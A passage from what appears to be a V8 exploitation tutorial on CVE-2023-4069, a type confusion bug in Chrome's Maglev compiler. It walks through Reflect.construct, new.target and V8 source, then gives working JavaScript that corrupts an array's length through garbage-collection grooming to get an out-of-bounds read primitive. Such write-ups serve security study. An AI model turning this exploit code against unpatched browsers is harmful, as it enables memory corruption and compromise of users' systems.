<pre tabindex="0"><code>C:\v8_dev\v8\v8\out&gt;x64.release\d8.exe
V8 version 11.5.150.16
d8&gt; load(&#39;new.js&#39;)
Must use the new operator with the &#34;new&#34; constructor
uf0
undefined
</code></pre><blockquote>
<p>Verifying the &rsquo;new.target&rsquo; Code</p>
</blockquote>
<p>As we might predict, the first line prints an error since an exception
is caught by <em>new.target</em> due to the object being created without the
<em>new</em> operator. On the other hand, the second line correctly prints the
parameter because the object has been instantiated with the_new_ constructor.</p>
<p>The last <em>undefined</em> string can be safely ignored, as it is printed
because the script does not return any explicit value.</p>
<p>Moving forward with our JS language prerequisites, let&rsquo;s discuss the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct">reflect.construct</a></p>
<p>With <em>reflect.construct</em> we can indirectly call <em>new.target</em>. It has
the following syntax.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">argumentsList</span><span class="p">,</span> <span class="nx">newTarget</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p>Reflect.construct Syntax</p>
</blockquote>
<p>According to the MDN docs:</p>
<p><em>&ldquo;The Reflect.construct(target, argumentsList, newTarget) is semantically equivalent to: <code>new target(...argumentsList);</code>&rdquo;</em></p>
<p>We can now combine the <em>reflect.construct</em> and class inheritance in the following example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="kr">class</span> <span class="nx">B</span> <span class="kr">extends</span> <span class="nx">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">A</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">B</span><span class="p">);</span>  
</span></span></code></pre></div><p>After creating two classes, with B as an extension of A, we then
invoke <em>reflect.construct</em> by passing <em>A</em> as a <em>target</em> and <em>B</em> as a
<em>newTarget</em>. If we test the above code under d8 we get the following
output.</p>
<pre tabindex="0"><code>d8&gt; load(&#39;reflect.construct.js&#39;)
A
B
B
</code></pre><blockquote>
<p>Testing reflect.construct</p>
</blockquote>
<p>In the first two lines we get each class
target name, as expected. However, the third line shows that only <em>B</em>
is printed after calling <em>Reflect.construct</em>.
Why so?</p>
<p>Well, when <code>Reflect.construct(A, [], B)</code> is used, it creates a new instance
of <em>A</em>, but it sets the constructor&rsquo;s <em>new.target</em> to <em>B</em>. This means
that within <em>A</em>&rsquo;s constructor, <em>new.target</em> points to <em>B</em>, not <em>A</em>.
So, even though <em>A</em>&rsquo;s constructor is executed, <em>new.target</em>
makes it print <em>B</em> instead of <em>A</em>.</p>
<p>What is even more interesting about <em>Reflect.construct</em> is that it
shows different behavior depending on whether the called function
returns a value or not.</p>
<p>Let&rsquo;s better grasp this concept with an example. We first create a function
<em>target</em> that returns an array of three SMIs and call it via
<em>Reflect.construct</em>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">target</span><span class="p">()</span> <span class="p">{</span><span class="k">return</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">];}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">newtarget</span><span class="p">()</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">newtarget</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<p>Reflect.construct with a Returning Value Function</p>
</blockquote>
<p>Once more we load the code into d8, this time with the <em>&ndash;allow-natives-syntax</em> flag. This
allows us to inspect details about any kind of JS object.</p>
<pre tabindex="0"><code>C:\v8_dev\v8\v8\out&gt;x64.release\d8.exe --allow-natives-syntax
V8 version 11.5.150.16
d8&gt; load(&#39;reflect.js&#39;)
DebugPrint: 000002B70004C139: [JSArray]
 - map: 0x02b70018e299 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x02b70018e4dd &lt;JSArray[0]&gt;
 - elements: 0x02b70019a805 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]
 - length: 3
 - properties: 0x02b700000219 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    000002B700000E0D: [String] in ReadOnlySpace: #length: 0x02b700144a3d &lt;AccessorInfo name= 0x02b700000e0d &lt;String[6]: #length&gt;, data= 0x02b700000251 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor
 }
 - elements: 0x02b70019a805 &lt;FixedArray[3]&gt; {
           0: 1
           1: 2
           2: 3
 }
</code></pre><blockquote>
<p>Inspecting the returned value</p>
</blockquote>
<p>As expected, the function returned a <em>JSArray</em> containing the three
SMIs.</p>
<p>Let&rsquo;s try a similar approach, but this time we call a
target function that returns nothing.</p>
<pre tabindex="0"><code>function target() {}
function newtarget() {}
var x = Reflect.construct(target, [], newtarget);
%DebugPrint(x); 
</code></pre><blockquote>
<p>Reflect.construct with a Non-Returning Value Function</p>
</blockquote>
<p>Now, the <em>target</em> function does not return any value, so we should expect an <em>undefined</em> return value message from the console/debugger.
Let&rsquo;s verify it via d8, once more.</p>
<pre tabindex="0"><code>d8&gt; load(&#39;rc2.js&#39;)
DebugPrint: 000002100004C0F9: [JS_OBJECT_TYPE]
 - map: 0x02100019a959 &lt;Map[52](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x02100004c08d &lt;Object map = 000002100019A931&gt;
 - elements: 0x021000000219 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x021000000219 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {}
000002100019A959: [Map] in OldSpace
 - type: JS_OBJECT_TYPE
...
</code></pre><blockquote>
<p>Inspecting the returned value from a non-returning function</p>
</blockquote>
<p>Surprisingly, the function returns a pointer to a
<a href="https://source.chromium.org/chromium/chromium/src/+/0e4c9a3d8b9194c4885a1576fce9e0dc9004a22c:v8/src/builtins/x64/builtins-x64.cc;l=146"><em>JS_OBJECT_TYPE</em></a>
instead of <em>undefined</em>.</p>
<p>In V8 when creating a new object via <a href="https://source.chromium.org/chromium/chromium/src/+/79c9dc7ddf20ae484798ec359d62aafb09a8c291:v8/src/builtins/builtins-constructor-gen.cc;l=260;bpv=0;bpt=0"><em>FastNewObject</em></a> the default
receiver is created as well. If the target function returns an object,
the default receiver is discarded and the returned object is used;
otherwise, the default receiver is returned.</p>
<p>Let&rsquo;s clarify this concept further with a few code samples:</p>
<p>In V8, each JavaScript function has an <em>initial_map</em>, which is a <em>Map</em>
object that determines the type and memory layout of the receiver
object. As discussed previously, a map is essential for defining an
object&rsquo;s hidden type, memory layout, and field storage.</p>
<p>When <em>FastNewObject</em> creates a default receiver object, it attempts to
use the <em>initial_map</em> of <em>new.target</em> as the map for this object.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">TNode</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">ConstructorBuiltinsAssembler</span><span class="o">::</span><span class="n">FastNewObject</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">,</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">TNode</span><span class="o">&lt;</span><span class="n">JSReceiver</span><span class="o">&gt;</span> <span class="n">new_target</span><span class="p">,</span> <span class="n">Label</span><span class="o">*</span> <span class="n">call_runtime</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Verify that the new target is a JSFunction.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">Label</span> <span class="nf">end</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">TNode</span> <span class="n">new_target_func</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">      <span class="n">HeapObjectToJSFunctionWithPrototypeSlot</span><span class="p">(</span><span class="n">new_target</span><span class="p">,</span> <span class="n">call_runtime</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">GotoIf</span><span class="p">(</span><span class="n">DoesntHaveInstanceType</span><span class="p">(</span><span class="n">CAST</span><span class="p">(</span><span class="n">initial_map_or_proto</span><span class="p">),</span> <span class="n">MAP_TYPE</span><span class="p">),</span> <span class="n">call_runtime</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">TNode</span> <span class="n">initial_map</span> <span class="o">=</span> <span class="n">CAST</span><span class="p">(</span><span class="n">initial_map_or_proto</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">TNode</span> <span class="n">new_target_constructor</span> <span class="o">=</span> <span class="n">LoadObjectField</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="n">initial_map</span><span class="p">,</span> <span class="n">Map</span><span class="o">::</span><span class="n">kConstructorOrBackPointerOrNativeContextOffset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">GotoIf</span><span class="p">(</span><span class="n">TaggedNotEqual</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">new_target_constructor</span><span class="p">),</span> <span class="n">call_runtime</span><span class="p">);</span>  <span class="c1">//&lt;--- check
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
</span></span><span class="line"><span class="cl">  <span class="n">BIND</span><span class="p">(</span><span class="o">&</span><span class="n">instantiate_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">AllocateJSObjectFromMap</span><span class="p">(</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">properties</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span> <span class="n">base</span><span class="o">::</span><span class="n">nullopt</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                 <span class="n">AllocationFlag</span><span class="o">::</span><span class="n">kNone</span><span class="p">,</span> <span class="n">kWithSlackTracking</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>FastNewObject function</p>
</blockquote>
<p>If <em>FastNewObject</em> fails, it calls the runtime path
<a href="https://source.chromium.org/chromium/chromium/src/+/ba1b4d2b303094d63f500878f3670f2235f988c7:v8/src/objects/js-objects.cc;l=2374">JSObject::New</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">JSObject</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">constructor</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">new_target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">AllocationSite</span><span class="o">&gt;</span> <span class="n">site</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">initial_map</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ASSIGN_RETURN_ON_EXCEPTION</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="n">isolate</span><span class="p">,</span> <span class="n">initial_map</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">JSFunction</span><span class="o">::</span><span class="n">GetDerivedMap</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">constructor</span><span class="p">,</span> <span class="n">new_target</span><span class="p">),</span> <span class="n">JSObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">result</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewFastOrSlowJSObjectFromMap</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="n">initial_map</span><span class="p">,</span> <span class="n">initial_capacity</span><span class="p">,</span> <span class="n">AllocationType</span><span class="o">::</span><span class="n">kYoung</span><span class="p">,</span> <span class="n">site</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>JSObject::New function</p>
</blockquote>
<p><em>GetDerivedMap</em> may call <em>FastInitializeDerivedMap</em> to create <em>initial_map</em> in <em>new_target</em>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">FastInitializeDerivedMap</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">new_target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">constructor</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">constructor_initial_map</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">      <span class="n">Map</span><span class="o">::</span><span class="n">CopyInitialMap</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">constructor_initial_map</span><span class="p">,</span> <span class="n">instance_size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="n">in_object_properties</span><span class="p">,</span> <span class="n">unused_property_fields</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">map</span><span class="o">-&gt;</span><span class="n">set_new_target_is_base</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">HeapObject</span><span class="o">&gt;</span> <span class="n">prototype</span><span class="p">(</span><span class="n">new_target</span><span class="o">-&gt;</span><span class="n">instance_prototype</span><span class="p">(),</span> <span class="n">isolate</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">JSFunction</span><span class="o">::</span><span class="n">SetInitialMap</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">new_target</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="n">prototype</span><span class="p">,</span> <span class="n">constructor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>FastInitializeDerivedMap function</p>
</blockquote>
<p>The <em>initial_map</em> here is a copy of the <em>initial_map</em> of <em>target</em> but
with the prototype set to <em>new_target</em>&rsquo;s prototype and the constructor
set to <em>target</em>.</p>
<p>In other words, the purpose of <em>FastNewObject</em> is to check that the
default receiver object is created correctly and efficiently by using
the correct <em>initial_map</em>.</p>
<p>When creating objects from classes with no-op (aka do-nothing) default
constructors, V8 optimizes by skipping these constructors. For
instance:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">A</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">B</span> <span class="kr">extends</span> <span class="nx">A</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
</span></span></code></pre></div><p>Here, calling <em>new B()</em> skips the default constructor <em>A</em> to optimize
performance.</p>
<p>The <em>FindNonDefaultConstructorOrConstruct</em> compiler optimization
skips no-op constructors.</p>
<p>The following byte code has been generated for the above code snippet, by passing the <em>&ndash;print-bytecode</em> flag to d8.</p>
<pre tabindex="0"><code>C:\v8_dev\v8\v8\out&gt;x64.release\d8.exe --print-bytecode
V8 version 11.5.150.16
d8&gt; load(&#39;bug.js&#39;)
...
[generated bytecode for function: B (0x00510019a64d &lt;SharedFunctionInfo B&gt;)]
Bytecode length: 38
Parameter count 1
Register count 9
Frame size 72
Bytecode age: 0
         000000510019AA4A @    0 : 89                CreateRestParameter
         000000510019AA4B @    1 : c3                Star2
         000000510019AA4C @    2 : 19 fe f9          Mov &lt;closure&gt;, r1
         000000510019AA4F @    5 : 5a f9 fa f3       FindNonDefaultConstructorOrConstruct r1, r0, r7-r8
         000000510019AA53 @    9 : 19 f8 f5          Mov r2, r5
         000000510019AA56 @   12 : 0b f3             Ldar r7
         000000510019AA58 @   14 : 19 f9 f7          Mov r1, r3
         000000510019AA5B @   17 : 19 fa f4          Mov r0, r6
         000000510019AA5E @   20 : 19 f2 f6          Mov r8, r4
         000000510019AA61 @   23 : 99 0c             JumpIfTrue [12] (000000510019AA6D @ 35)
         000000510019AA63 @   25 : ae f6             ThrowIfNotSuperConstructor r4
         000000510019AA65 @   27 : 0b f4             Ldar r6
         000000510019AA67 @   29 : 6a f6 f5 01 00    ConstructWithSpread r4, r5-r5, [0]
         000000510019AA6C @   34 : c1                Star4
         000000510019AA6D @   35 : 0b f6             Ldar r4
         000000510019AA6F @   37 : aa                Return
...
</code></pre><blockquote>
<p>Analyzing ByteCode for Function B</p>
</blockquote>
<p>From the above listing, if <em>FindNonDefaultConstructorOrConstruct</em> is
true, it will take the <em>JumpIfTrue</em> statement, jumping to
<em>000000510019AA6D</em>, and thus return the default receiver.</p>
<p>To sum up, the vulnerability of CVE-2023-4069 occurs in the way Maglev
handles
<a href="../../../../blog/2024/06/05/intro-v8-exploitation-maglev/FindNonDefaultConstructorOrConstruct.html"><em>FindNonDefaultConstructorOrConstruct</em></a>.</p>
<p>The <em>FindNonDefaultConstructorOrConstruct</em> optimization skips no-op
constructors. If it reaches the base constructor,
<em>BuildAllocateFastObject</em> is used instead of <em>FastNewObject</em> to
create the receiver object.</p>
<p>The problem is that <em>BuildAllocateFastObject</em> doesn&rsquo;t verify the
constructor field of <em>new_target</em>&rsquo;s <em>initial_map</em>. This can lead to
creating objects with uninitialized fields if <em>new_target</em> and
<em>target</em> are different, causing a type confusion bug.</p>
<p>The only caveat here is that the
<em>VisitFindNonDefaultConstructorOrConstruct</em> checks if <em>new_target</em> is
a constant before calling <em>FastObject</em>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">MaglevGraphBuilder</span><span class="o">::</span><span class="n">VisitFindNonDefaultConstructorOrConstruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">          <span class="n">compiler</span><span class="o">::</span><span class="n">OptionalHeapObjectRef</span> <span class="n">new_target_function</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">              <span class="n">TryGetConstant</span><span class="p">(</span><span class="n">new_target</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_target_function</span> <span class="o">&&</span> <span class="n">new_target_function</span><span class="o">-&gt;</span><span class="n">IsJSFunction</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">object</span> <span class="o">=</span> <span class="n">BuildAllocateFastObject</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                  <span class="n">FastObject</span><span class="p">(</span><span class="n">new_target_function</span><span class="o">-&gt;</span><span class="n">AsJSFunction</span><span class="p">(),</span> <span class="n">zone</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                             <span class="n">broker</span><span class="p">()),</span>
</span></span><span class="line"><span class="cl">                  <span class="n">AllocationType</span><span class="o">::</span><span class="n">kYoung</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<p>VisitFindNonDefaultConstructorOrConstruct Checks that new_target is a Constant</p>
</blockquote>
<p>The function responsible for checking if the <em>new_taget</em> is a constant is aptly named <a href="https://source.chromium.org/chromium/chromium/src/+/ecca8fb3876014c0c5f245df70d7e45e07711e69:v8/src/maglev/maglev-graph-builder.cc;l=2234;bpv=0"><em>TryGetConstant</em></a>.</p>
<p>In the below code we can see how to force the <em>new_target</em> a constant.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">A</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">B</span> <span class="kr">extends</span> <span class="nx">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span><span class="p">.</span><span class="nx">target</span><span class="p">;</span>  <span class="c1">// caching x as a constant
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">super</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">B</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">x</span><span class="p">);</span> 
</span></span></code></pre></div><blockquote>
<p>Forcing new.target as a Constant</p>
</blockquote>
<p>In the above code, we are creating a base class <em>A</em> and a subclass <em>B</em>
that extends <em>A</em>. In <em>B</em>&rsquo;s constructor, the <em>new.target</em> is cached in
a global variable <em>x</em>.</p>
<p>In the last line, we are calling <em>B</em> as <em>target</em> and <em>x</em> as
<em>new_target</em>. Given that we&rsquo;re passing the <em>TryGetConstant</em>, we are
hitting the vulnerable code path, leading to <em>FastObject</em>.</p>
<p>What is really happening, is that <em>Reflect.construct</em> creates an instance of
<em>B</em> but sets <em>new.target</em> to <em>Array</em>, meaning that <em>x</em> becomes an
<em>Array</em> type object.</p>
<p>Arrays have a <em>length</em> field that needs proper initialization. If <em>B</em>
initializes this <em>Array</em> without setting <em>length</em>, it remains
uninitialized, which might lead to memory corruption, as mentioned before.</p>
<p>Normally, V8 would ensure that the constructor of <em>new.target</em> matches the
expected type to prevent this. Without this check in Maglev, the
vulnerability arises.</p>
<p>As we&rsquo;re almost done covering the necessary theory to perform an
out-of-bounds (OOB) array access, we need to face one last
hurdle.</p>
<p>When Maglev optimizes <em>B</em> and the optimized code runs,
<em>Reflect.construct</em> often creates an Array with a length of 0 because
free memory initially contains zeroes, which is not an ideal value for
OOB access.</p>
<p>However, by repeatedly creating and deleting objects, and triggering
garbage collection, we can manipulate the memory so the uninitialized
Array ends up with arbitrary lengths that might be great for
corrupting useful addresses like object pointers.</p>
<p>Putting together what we have learned so far, we obtain the following
code that gives us a primitive OOB read through array corruption.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">A</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">B</span> <span class="kr">extends</span> <span class="nx">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span><span class="p">.</span><span class="nx">target</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="kr">super</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">construct</span><span class="p">(</span><span class="nx">B</span><span class="p">,</span> <span class="p">[],</span> <span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">2000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">corruptedArr</span> <span class="o">=</span> <span class="nx">construct</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">corruptedArr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">gcSize</span> <span class="o">=</span> <span class="mh">0x4fe00000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">gcSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">gcSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">corruptedArr</span> <span class="o">=</span> <span class="nx">construct</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">corruptedArr</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<p>Corrupting the Array After Triggering Garbage Collection</p>
</blockquote>
<p>Once the code gets optimized via the <em>for loop</em>, we print the array via
debug statement. We then trigger the garbage collector twice and print
out the value of the array.</p>
<p>The value <em>0x4fe00000</em> (about 1.34 GB) is good for triggering
garbage collection because it is large enough to allocate
significant memory, filling a good chunk of the <a href="../../../../poc2022/ManYueMo.pdf">V8 heap
memory</a> of 4GB.
This will force the JS engine to perform garbage collection.</p>
<p>Running the above code in d8 reveals the following array properties:</p>
<pre tabindex="0"><code>C:\v8_dev\v8\v8\out&gt;x64.release\d8.exe --allow-natives-syntax --maglev
V8 version 11.5.150.16
d8&gt; load(&#39;oob.js&#39;)
DebugPrint: 000000F300070D69: [JSArray]
 - map: 0x00f30018e299 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x00f30018e4dd &lt;JSArray[0]&gt;
 - elements: 0x00f300000219 &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]
 - length: 0
...
DebugPrint: 000000F300042139: [JSArray]
